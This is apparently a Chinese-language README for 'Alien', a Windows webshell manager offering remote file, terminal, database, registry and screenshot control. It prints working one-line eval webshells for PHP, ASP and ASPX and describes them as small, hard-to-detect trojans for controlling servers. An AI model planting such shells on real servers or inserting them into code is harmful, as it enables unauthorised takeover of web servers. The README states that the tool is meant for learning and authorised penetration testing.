# Alien

Webshell 管理工具

## Author
- [@ISSAC](https://www.github.com/malbuffer4pt)

# 免責聲明
工具只限用於學習用途，網站管理和合法滲透測試，不可用於非法用途。\
如非法使用則後果自負。

## 工具平台
Windows

## 語言
C# .NET Framework V4.8

## 功能
- File Manager (可顯示圖片, 可SearchFile)
- Virtual Terminal
- Database
- Registry
- Monitor
- Screenshot
- System Information

## 一句話木馬
一句話木馬是在滲透測試中用來控制伺服器的工具\
強大之處在於木馬本身體積小，不易發現\
以下是最簡單的一句話木馬

- PHP
```<?php @eval($_POST['password']);?>```
- ASP
```<%execute(request("password"))%>```
- ASPX
```<%@ Page Language="Jscript"%><%eval(Request.Item["password"])%>```
當然, Alien還可以使用asmx, ashx等等的Webshell。
- NodeJS & JSP
```https://github.com/malbuffer4pt/Alien/blob/main/shell.txt```

## 關於JSP webshell
目前只有比較原始的菜刀版本, 之後可能會加上蟻劍和冰蝎\
shell有進行更改, 新增了可以顯示圖片的功能

## 關於NodeJS webshell
由於NodeJS特性, 原理跟一般php asp aspx等動態語言的shell不同, \
NodeJS目的重在管理而非滲透

## 伺服器
Windows Linux Unix MacOS

## Database管理
- MySQL : PHP
- Access : https://github.com/malbuffer4pt/DBer
- SQL Server : ASP ASPX ASMX ASHX

## 原理
以PHP為例子, eval()可以把string以PHP Code去執行，\
如果eval()中帶有可控變數，那麼就可以執行任意程式碼。\
如eval($_POST['a']);\
HTTP POST a=phpinfo(); 就可以執行phpinfo();

## 注意!
- 工具Payloads資料夾內有符合惡意程式的Payload, 可能會被防毒刪除
- 目前只有刪減版，但部份程式碼沒有刪除，Disassemble應該會有奇怪但無法使用的東西

## 圖片
![5](https://github.com/malbuffer4pt/Alien/blob/main/5.png)
![1](https://github.com/malbuffer4pt/Alien/blob/main/1.png)
![6](https://github.com/malbuffer4pt/Alien/blob/main/6.png)
![2](https://github.com/malbuffer4pt/Alien/blob/main/2.png)
![3](https://github.com/malbuffer4pt/Alien/blob/main/3.png)
![4](https://github.com/malbuffer4pt/Alien/blob/main/4.png)
![7](https://github.com/malbuffer4pt/Alien/blob/main/7.png)
![8](https://github.com/malbuffer4pt/Alien/blob/main/8.png)
![9](https://github.com/malbuffer4pt/Alien/blob/main/9.png)
![10](https://github.com/malbuffer4pt/Alien/blob/main/10.png)
![11](https://github.com/malbuffer4pt/Alien/blob/main/11.png)
![12](https://github.com/malbuffer4pt/Alien/blob/main/12.png)
11
## 致謝
研究webshell的各位前輩
